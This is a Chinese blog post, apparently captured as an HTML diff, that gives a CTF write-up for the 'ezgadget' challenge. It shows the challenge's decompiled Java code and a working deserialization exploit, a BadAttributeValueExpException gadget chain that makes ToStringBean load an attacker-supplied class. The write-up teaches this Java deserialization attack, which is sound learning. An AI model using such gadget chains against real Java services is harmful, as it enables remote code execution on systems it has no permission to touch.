@@ -1,0 +1,420 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+     
+
+<meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=0">
+<title>CTF:简单的ezgadget | ch1e的随笔</title>
+<meta name="author" content="ch1e">
+<meta name="copyright" content="ch1e">
+
+<link rel="shortcut icon" href="https://ch1e.cn/img/favicon.ico"> 
+
+
+    <meta name="keywords" content="web安全,代码审计,渗透测试">
+
+
+
+     
+    <meta name="description" content="前言摸鱼了好几天，来点康复训练吧，今天来题简单的ctf题，东华杯的ezgadget，先把源码下载，然后反编译。 正文大致目录结构如下，包括了一个UserBean，一个IndexController，一个tools类和一个ToStringBean类  User.java，这就是一个普通的实现Serializable接口的一个JavaBean 12345678910111213141516171819">
+<meta property="og:type" content="article">
+<meta property="og:title" content="CTF:简单的ezgadget">
+<meta property="og:url" content="https://ch1e.cn/2022/05/05/ezgadget/">
+<meta property="og:site_name" content="ch1e的随笔">
+<meta property="og:description" content="前言摸鱼了好几天，来点康复训练吧，今天来题简单的ctf题，东华杯的ezgadget，先把源码下载，然后反编译。 正文大致目录结构如下，包括了一个UserBean，一个IndexController，一个tools类和一个ToStringBean类  User.java，这就是一个普通的实现Serializable接口的一个JavaBean 12345678910111213141516171819">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://q4.qlogo.cn/headimg_dl?dst_uin=1444440144&spec=100">
+<meta property="article:published_time" content="2022-05-05T07:42:00.097Z">
+<meta property="article:modified_time" content="2022-05-05T10:19:55.839Z">
+<meta property="article:author" content="ch1e">
+<meta property="article:tag" content="web安全">
+<meta property="article:tag" content="代码审计">
+<meta property="article:tag" content="渗透测试">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://q4.qlogo.cn/headimg_dl?dst_uin=1444440144&spec=100">
+ 
+
+<meta http-equiv="Cache-Control" content="no-siteapp"/>
+<link href="//cdn.jsdelivr.net" rel="preconnect">
+<link href="https://ch1e.cn" rel="prefetch">
+<link href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css " rel="stylesheet">
+<link href="/css/main.css " rel="stylesheet">
+<script src="/js/utlis.js"></script>
+ 
+    
+ 
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+<body>
+     
+    
+ 
+     
+
+<script>
+    var $config = {
+        tocStyle: "visible",
+        CDN:{
+            fancyboxJs: "https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.js",
+            fancyboxCss: "https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.css"
+        },
+        
+        
+    }
+</script>
+    
+
+
+
+
+  
+
+
+    <div id="body-wrap">
+        <nav id="nav-wrap">
+  <div class="navbar">
+    <div class="bar">
+      <a href="/" class="title">ch1e的随笔</a>
+
+      
+      <ul class="menu">
+         
+        <li><a href="/">首页</a></li>
+          
+        <li>
+          <a class="menu-child-hover" href="javascript:void(0);">找文章</a>
+          <ul class="menu-child">
+            
+            <li><a href='/tags'>标签</a></li>
+            
+            <li><a href='/archives'>归档</a></li>
+            
+          </ul>
+        </li>
+          
+        <li><a href="/link">友情链接</a></li>
+         
+      </ul>
+      <i class="fas fa-bars open-nav"></i>
+    </div>
+  </div>
+  <div id="mobile-nav">
+    <ul>
+       
+      <li><a href="/">首页</a></li>
+         
+      <li><a href='/tags'>标签</a></li>
+      
+      <li><a href='/archives'>归档</a></li>
+         
+      <li><a href="/link">友情链接</a></li>
+       
+    </ul>
+  </div>
+</nav>
+
+
+        <main id="main">
+            
+
+<article id="post">
+  <div class="post-info">
+    <div class="post-title">
+      <h1>CTF:简单的ezgadget</h1>
+    </div>
+    <div class="post-meta">
+      <div class="post-date">
+        <i class="far fa-calendar-alt fa-fw post-meta-icon"></i>
+        <span class="post-meta-label">
+          发表于
+            2022-05-05 |
+        </span>
+        
+        <i class="fas fa-history fa-fw post-meta-icon"></i>
+        <span class="post-meta-label">
+          更新于
+            2022-05-05
+        </span>
+      </div>
+      <div class="post-meta-wordcount">
+        <i class="far fa-file-word fa-fw post-meta-icon"></i>
+        <span class="post-meta-label">总字数:</span>
+        <span class="word-count">1.1k | </span>
+        <i class="far fa-clock fa-fw post-meta-icon"></i>
+        <span class="post-meta-label">阅读时长:</span>
+        <span>5分钟</span>
+        
+      </div>
+    </div>
+  </div>
+  <div class="post-content">
+    <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>摸鱼了好几天，来点康复训练吧，今天来题简单的ctf题，东华杯的ezgadget，先把源码下载，然后反编译。</p>
+<h1 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h1><p>大致目录结构如下，包括了一个UserBean，一个IndexController，一个tools类和一个ToStringBean类</p>
+<p><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220505154442563.png" alt="image-20220505154442563"></p>
+<p>User.java，这就是一个普通的实现Serializable接口的一个JavaBean</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ezgame.ctf.bean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: e14568b06e182.jar:BOOT-INF/classes/com/ezgame/ctf/bean/User.class */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">User</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String UserName;</span><br><span class="line">    <span class="keyword">private</span> String PassWord;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getUserName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.UserName;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setUserName</span><span class="params">(String userName)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.UserName = userName;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getPassWord</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.PassWord;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setPassWord</span><span class="params">(String passWord)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.PassWord = passWord;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;User&#123;UserName=&#x27;&quot;</span> + <span class="keyword">this</span>.UserName + <span class="string">&quot;&#x27;, PassWord=&#x27;&quot;</span> + <span class="keyword">this</span>.PassWord + <span class="string">&quot;&#x27;&#125;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>IndexController.java，在/readObject里传入一个data值，把data通过base64解码，然后给字节流，再给对象输入流，从流中先读取一个String类型的name，再读取一个int类型的year，需要满足name=gadgets并且year=2021</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ezgame.ctf.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.ezgame.ctf.tools.Tools;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletResponse;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.xml.BeanDefinitionParserDelegate;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.ui.Model;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.ResponseBody;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="comment">/* loaded from: e14568b06e182.jar:BOOT-INF/classes/com/ezgame/ctf/controller/IndexController.class */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> </span>&#123;</span><br><span class="line">    <span class="meta">@RequestMapping(&#123;&quot;/&quot;&#125;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">index</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> BeanDefinitionParserDelegate.INDEX_ATTRIBUTE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(&#123;&quot;/readobject&quot;&#125;)</span></span><br><span class="line">    <span class="meta">@ResponseBody</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">unser</span><span class="params">(<span class="meta">@RequestParam(name = &quot;data&quot;, required = true)</span> String data, Model model)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">byte</span>[] b = Tools.base64Decode(data);</span><br><span class="line">        InputStream inputStream = <span class="keyword">new</span> ByteArrayInputStream(b);</span><br><span class="line">        ObjectInputStream objectInputStream = <span class="keyword">new</span> ObjectInputStream(inputStream);</span><br><span class="line">        String name = objectInputStream.readUTF();</span><br><span class="line">        <span class="keyword">int</span> year = objectInputStream.readInt();</span><br><span class="line">        <span class="keyword">if</span> (!name.equals(<span class="string">&quot;gadgets&quot;</span>) || year != <span class="number">2021</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;welcome bro.&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;welcome bro.&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>tools.java，一个工具类，提供了base64编码解码以及序列化和反序列化的功能</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ezgame.ctf.tools;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: e14568b06e182.jar:BOOT-INF/classes/com/ezgame/ctf/tools/Tools.class */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Tools</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] base64Decode(String base64) &#123;</span><br><span class="line">        Base64.Decoder decoder = Base64.getDecoder();</span><br><span class="line">        <span class="keyword">return</span> decoder.decode(base64);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">base64Encode</span><span class="params">(<span class="keyword">byte</span>[] bytes)</span> </span>&#123;</span><br><span class="line">        Base64.Encoder encoder = Base64.getEncoder();</span><br><span class="line">        <span class="keyword">return</span> encoder.encodeToString(bytes);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] serialize(<span class="keyword">final</span> Object obj) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ByteArrayOutputStream btout = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream objOut = <span class="keyword">new</span> ObjectOutputStream(btout);</span><br><span class="line">        objOut.writeObject(obj);</span><br><span class="line">        <span class="keyword">return</span> btout.toByteArray();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">deserialize</span><span class="params">(<span class="keyword">final</span> <span class="keyword">byte</span>[] serialized)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ByteArrayInputStream btin = <span class="keyword">new</span> ByteArrayInputStream(serialized);</span><br><span class="line">        ObjectInputStream objIn = <span class="keyword">new</span> ObjectInputStream(btin);</span><br><span class="line">        <span class="keyword">return</span> objIn.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>ToStringBean.java ，这个类其实很奇怪，继承了ClassLoader类和实了Serializable接口，并且在他的toString方法中实例化了一个ToStringBean对象，并且使用他的defineClass方法，我们知道这个defineClass是加载字节码的，所以说这里的话我们可以通过调用toString方法来加载我们的恶意字节码，所以我们需要构造一个恶意类，并且先往流里面写入一个String类型的name和int类型的year，再写入我们的恶意类即可</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ezgame.ctf.tools;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: e14568b06e182.jar:BOOT-INF/classes/com/ezgame/ctf/tools/ToStringBean.class */</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ToStringBean</span> <span class="keyword">extends</span> <span class="title">ClassLoader</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">byte</span>[] ClassByte;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        ToStringBean toStringBean = <span class="keyword">new</span> ToStringBean();</span><br><span class="line">        Class clazz = toStringBean.defineClass(<span class="keyword">null</span>, <span class="keyword">this</span>.ClassByte, <span class="number">0</span>, <span class="keyword">this</span>.ClassByte.length);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            clazz.newInstance();</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;enjoy it.&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;enjoy it.&quot;</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (InstantiationException e2) &#123;</span><br><span class="line">            e2.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;enjoy it.&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>所以思路很清晰，如果是toString的话，就使用BadAttributeValueExpException，也就是CC5那条链。这里有几个坑点，首先是在new BadAttributeValueExpException的时候需要随便输入几个数组， 然后再使用反射去修改他的val值，防止在第一遍就触发，还有就是base64编码以后，会存在加号，加号默认是空格，所以我们需要进行url编码。最终的调用链如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BadAttributeValueExpException.readObject-&gt;ToStringBean-&gt;toString-&gt;defineClass+newInstance()</span><br></pre></td></tr></table></figure>
+
+<p>最终的payload如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.ezgame.ctf.tools.ToStringBean;</span><br><span class="line"><span class="keyword">import</span> com.ezgame.ctf.tools.Tools;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">exp</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ToStringBean toStringBean=<span class="keyword">new</span> ToStringBean();</span><br><span class="line">        Class clazz=ToStringBean.class;</span><br><span class="line">        Field classByte = clazz.getDeclaredField(<span class="string">&quot;ClassByte&quot;</span>);</span><br><span class="line">        classByte.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="keyword">byte</span>[] bytes= Files.readAllBytes(Paths.get(<span class="string">&quot;C:\\Users\\86155\\Desktop\\student-manage-master\\ezgadget\\target\\classes\\payload.class&quot;</span>));</span><br><span class="line">        classByte.set(toStringBean,bytes);</span><br><span class="line"></span><br><span class="line">        BadAttributeValueExpException badAttributeValueExpException=<span class="keyword">new</span> BadAttributeValueExpException(<span class="number">123456</span>);</span><br><span class="line">        Field valField = badAttributeValueExpException.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        valField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        valField.set(badAttributeValueExpException,toStringBean);</span><br><span class="line"></span><br><span class="line">        ByteArrayOutputStream byteArrayOutputStream = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream objectOutputStream = <span class="keyword">new</span> ObjectOutputStream(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeUTF(<span class="string">&quot;gadgets&quot;</span>);</span><br><span class="line">        objectOutputStream.writeInt(<span class="number">2021</span>);</span><br><span class="line">        objectOutputStream.writeObject(badAttributeValueExpException);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">byte</span>[] bytes1=byteArrayOutputStream.toByteArray();</span><br><span class="line">        System.out.println(Tools.base64Encode(bytes1));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>其中payload.class是我们的恶意类，然后启动我们的jar包</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ezgadget.jar</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ch1e-img.oss-cn-beijing.aliyuncs.com/img/image-20220505181648153.png" alt="image-20220505181648153"></p>
+
+  </div>
+   
+   
+
+  
+  <div class="post-copyright">
+    <div class="post-copyright-icon"></div>
+      <div class="post-copyright-author">
+          <span class="post-copyright-meta">文章作者: </span>
+            <span class="post-copyright-info">
+              <a href="mailto:1444440144@qq.com" >ch1e</a>
+            </span>
+      </div>
+      <div class="post-copyright-type">
+          <span class="post-copyright-meta">文章链接: </span>
+            <span class="post-copyright-info">
+              <a href="https://ch1e.cn/2022/05/05/ezgadget/" >https://ch1e.cn/2022/05/05/ezgadget/</a>
+            </span>
+      </div><div class="post-copyright-notice">
+          <span class="post-copyright-meta">版权声明: </span>
+            <span class="post-copyright-info">本博客所有文章除特别声明外，均采用
+              <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/ " target="_blank" >
+                  CC BY-NC-SA 4.0 </a> 许可协议。转载请注明来自
+              <a href="https://ch1e.cn/2022/05/05/ezgadget/" target="_blank" >ch1e</a>
+              ！</span>
+      </div>
+  </div>
+  
+
+
+ 
+
+  
+    <div class="post-tag">
+        <span>
+            <i class="fa fa-tag"></i>
+             
+            <a href="tags/web安全/"><span>web安全</span></a>
+                
+                    <i class="fas fa-angle-right"></i>
+                
+             
+            <a href="tags/代码审计/"><span>代码审计</span></a>
+                
+                    <i class="fas fa-angle-right"></i>
+                
+             
+            <a href="tags/渗透测试/"><span>渗透测试</span></a>
+                
+            
+        </span>
+    </div>
+  
+
+
+
+
+<div class="pagination-post">
+    
+    
+    <a href="/2022/05/04/javassist/">
+      <div class="next-title">无标题<i class="fas fa-chevron-right"></i></div>
+      <div class="next-desc">前言Java中所有的类都被编译为class文件来运行，在编译完class文件之后，类不能再被显示修改，而Javassist就是用来处理编译后的class文件，它可以用来修改方法或者新增方法，并且...</div>
+    </a>
+    
+</div>
+
+</article>
+ 
+
+
+  <div id="toc-wrap">
+    <div id="toc">
+      <div class="toc-title">
+        <div>
+          目录
+            <span class="num">0%</span>
+        </div>
+        <progress class="progress" value="0" max="100"></progress>
+      </div>
+      <div class="toc-list">
+         
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%AD%A3%E6%96%87"><span class="toc-text">正文</span></a></li></ol>
+      </div>
+    </div>
+  </div>
+
+
+        </main>
+        <section id="rightside">
+    
+    <div class="rightside-item">
+        
+        
+         
+        
+        
+            <a id="open-toc" title="目录">
+                <i class="fas fa-list-ul"></i>
+            </a>
+        
+         
+         
+        <a href="javascript:(0)" id="darkmode" title="深色/浅色 ">
+            <i class="fas fa-moon"></i>
+        </a>
+         
+        
+        <a href="#" title="回到顶部">
+            <i class="fas fa-arrow-up"></i>
+        </a>
+    </div>
+</section>
+         
+
+<footer class="footer" id="footer">
+    <div class="copyright">
+      &copy; 2020 - 2022
+        <i class="fas fa-fan"></i>
+        ch1e
+    </div>
+    <div class="framework-info">
+        <span>框架 </span>
+        <a href="https://hexo.io" target="_blank">Hexo</a>
+        <span class="footer-separator">|</span>
+        <span>主题 </span>
+        <a href="https://github.com/lete114/hexo-theme-MengD" target="_blank">MengD.(萌典) </a>
+    </div>
+    
+    <div class="custom-text">我相信我可以，但我一直在路上，所以我有无限的可能！！</div>
+</footer>
+    </div>
+    <div id="mask" onclick="closeAll()"></div>
+    
+    <div class="script">
+        <script src="/js/main.js"></script>
+        
+
+
+<script src="/js/lazyload.js"></script>
+
+
+    
+
+
+        
+    <script>
+        getScript('https://cdn.jsdelivr.net/npm/pjax/pjax.min.js',LoadPjax)
+        function LoadPjax() {
+            var pjax = new Pjax({
+                selectors: [
+                    'head title',
+                    'head meta[name="keywords"]',
+                    'head meta[name="description"]',
+                    'main',
+                    '#rightside'
+                ],
+                cache: true,
+                cacheBust: false
+            });
+        }
+
+        // 清除时间
+        var timer = null;
+        // 执行进度条
+        function ProgressStart() {
+            // 设置初始进度
+            var progress = 10;
+            // 创建进度条 及 css样式
+            var div = document.createElement('div');
+            div.className = 'pjax-progress';
+            document.body.prepend(div);
+            // 定义随机数最大值最小值
+            var max = 10, mini = 3;
+            var result = max - mini;
+            // 清除
+            clearInterval(timer);
+            // 0.5秒内累加进度
+            timer = setInterval(function () {
+                // 随机数
+                var num = parseInt(Math.random() * result);
+                var randomResult = num + mini;
+                // 累加
+                progress += randomResult
+                document.getElementsByClassName('pjax-progress')[0].style.width = progress + '%';
+                // 当进度达到95%时停止
+                if (progress > 95) progress = 95
+            }, 500)
+        }
+        // 加载进度条加载完毕
+        function ProgressFinish() {
+            clearInterval(timer);
+            // 页面加载完毕后进度100% 并在0.7秒后删除
+            var progress = document.getElementsByClassName('pjax-progress');
+            progress[0].style.width = '100%';
+            timer = setTimeout(function () {
+                progress[0].parentNode.removeChild(progress[0])
+            }, 700);
+        }
+
+        // 开始 PJAX 执行的函数
+        document.addEventListener('pjax:send', function () {
+            // 执行进度条
+            ProgressStart()
+        });
+        // PJAX 完成之后执行的函数，可以和上面的重载放在一起
+        document.addEventListener('pjax:complete', function () {
+
+            // 加载进度条加载完毕
+            ProgressFinish()
+            // 执行所有方法
+            exeAllFn()
+
+            
+                // 图片懒加载
+                ImgLazyLoad('body img[data-img]', 'data-img')
+            
+
+
+            document.querySelectorAll('script[data-pjax]').forEach(item => {
+                const newScript = document.createElement('script')
+                const content = item.text || item.textContent || item.innerHTML || ''
+                Array.from(item.attributes).forEach(attr => newScript.setAttribute(attr.name, attr.value))
+                newScript.appendChild(document.createTextNode(content))
+                item.parentNode.replaceChild(newScript, item)
+            })
+        });
+
+        // Pjax请求错误时，跳转到404页面
+        document.addEventListener('pjax:error', (err) => {
+            if (err.request.status === 404) {
+                pjax.loadUrl('/404.html')
+            }
+        })
+    </script>
+
+    </div>
+</body>
+
+</html>
